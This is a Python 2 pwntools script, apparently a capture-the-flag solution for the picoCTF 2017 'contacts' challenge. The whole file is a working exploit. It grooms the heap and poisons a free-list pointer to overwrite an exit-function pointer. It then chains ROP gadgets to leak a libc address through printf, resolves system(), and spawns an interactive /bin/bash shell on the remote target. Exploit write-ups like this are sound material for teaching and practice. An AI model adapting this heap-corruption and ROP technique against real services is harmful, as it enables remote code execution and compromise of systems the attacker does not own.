#! /usr/bin/env python2

from pwn import *
import sys

if args['REMOTE']:
    r = remote("shell2017.picoctf.com", 57508)
    off_lsm = 0x21a50
    off_system = 0x41490
elif args['QIRA']:
    r = remote("192.168.0.7", 4000)
    off_lsm = 0x21a50
    off_system = 0x41490
else:
    r = remote("localhost", 13337)
    # r = process("./contacts")
    off_lsm = 0x20420
    off_system = 0x40d00

def w(txt, val):
    global r
    padlen = len(val)
    for ck in reversed(mkchunks(val)):
        r.recvuntil("$ ")
        padlen -= len(ck) + 1
        r.sendline(txt + "X" * padlen + ck)

def mkchunks(s):
    v = []
    i = 0
    while len(s) > 0:
        w = False
        if s[i] == "\x00":
            w = True
        elif s[i] == "\x0a":
            print "rip... got newline"
            sys.exit(0)
        if w or i == len(s) - 1:
            v.append(s[0:i])
            s = s[i + 1:]
            i = 0
        else:
            i += 1
    return v

p_lsm = 0x601ea0
main = 0x400e69
p6ret = 0x40142a
p4ret = 0x40142c
p3ret = 0x40142e
poprdi = 0x401433
poprsi = 0x401431

print "setting up heap..."
# 0x38 = 56
for i in xrange(64):
    r.recvuntil("$ ")
    r.sendline("add {} p{} 0000000000".format(i, i))

# free p0, numContacts = 63
# this puts 2 pointers in the free list
r.recvuntil("$ ")
r.sendline("add 0 p0 0")

# create p64, numContacts = 64
# this leaves p0 in the free list
r.recvuntil("$ ")
r.sendline("add 64 p64 0000000000")

# update p0->id to (fwd pointer) to point to &data.num_contacts - 8
r.recvuntil("$ ")
r.sendline("update-id p0 {}".format(0x602f38 - 8))

# create p65, this should be p0 and put data.exit_function onto the free list,
# numContacts = 65
r.recvuntil("$ ")
r.sendline("add 65 p65 0000000000")

# create p66, this should be &data.exit_function
print "getting &data.exit_function..."
r.recvuntil("$ ")
r.sendline("add 66 /bin/bash;%s-------- 0000000000")

print "leaking libc..."
# set exit function
r.recvuntil("$ ")
r.sendline("update-id /bin/bash;%s-------- {}".format(p4ret)) # writes username, id
# for i in xrange(8):
# set up a rop chain to pop all the way to buf and call printf("/bin/bash;%s--------", 0x601ea0)
# we first call exit(0), which points to pop 4 ret
# this sets RA = id = pop 6 ret
# this sets RA = first 8 bytes of phone = pop 3 ret
# this sets RA = first 8 bytes of username = pop 4 ret
# this sets RA = second 8 bytes of buf, where the first 8 bytes contains the quit command
# first 8 bytes of username
w("update-id ", p64(p4ret))                             # writes username
# first 8 bytes of phone
w("update-phone 1111 ", p64(p3ret))                     # writes phone, id
# id
r.recvuntil("$ ")
r.sendline("get {}".format(p6ret))                      # writes id

payload = ""
payload += p64(poprdi)
payload += p64(0x602f40 + 24)                           # rdi = "/bin/bash;%s--------"
payload += p64(poprsi)
payload += p64(p_lsm)                                   # rsi = lsm@got
payload += "B" * 8                                      # r15
payload += p64(0x400860)                                # printf(rdi, rsi)
payload += p64(main)                                    # go back to main
r.recvuntil("$ ")
r.sendline("A" * 8 + payload)                           # writes ropchain

r.recvuntil("$ ")
r.sendline("quit")
r.recvuntil("/bin/bash;")
l = r.recvuntil("--------Welcome to the contact manager.\n", drop=True)

lsm = u64(l + "\x00\x00")
libc_base = lsm - off_lsm
system = libc_base + off_system

print "libc_start_main = {}".format(hex(lsm))
print "system          = {}".format(hex(system))

print "getting shell..."
# set exit function
r.recvuntil("$ ")
r.sendline("update-id /bin/bash;%s-------- {}".format(p4ret)) # writes username, id
# for i in xrange(8):
# set up a rop chain to pop all the way to buf and call printf("/bin/bash;%s--------", 0x601ea0)
# we first call exit(0), which points to pop 4 ret
# this sets RA = id = pop 6 ret
# this sets RA = first 8 bytes of phone = pop 3 ret
# this sets RA = first 8 bytes of username = pop 4 ret
# this sets RA = second 8 bytes of buf, where the first 8 bytes contains the quit command
# first 8 bytes of username
w("update-id ", p64(p4ret))                             # writes username
# first 8 bytes of phone
w("update-phone 1111 ", p64(p3ret))                     # writes phone, id
# id
r.recvuntil("$ ")
r.sendline("get {}".format(p6ret))                      # writes id

payload = ""
payload += p64(poprdi)
payload += p64(0x602f40 + 24)                           # rdi = "/bin/bash;%s--------"
payload += p64(system)                                  # system(rdi)
payload += p64(main)                                    # go back to main
r.recvuntil("$ ")
r.sendline("A" * 8 + payload)                           # writes ropchain

r.recvuntil("$ ")
r.sendline("quit")

r.interactive()
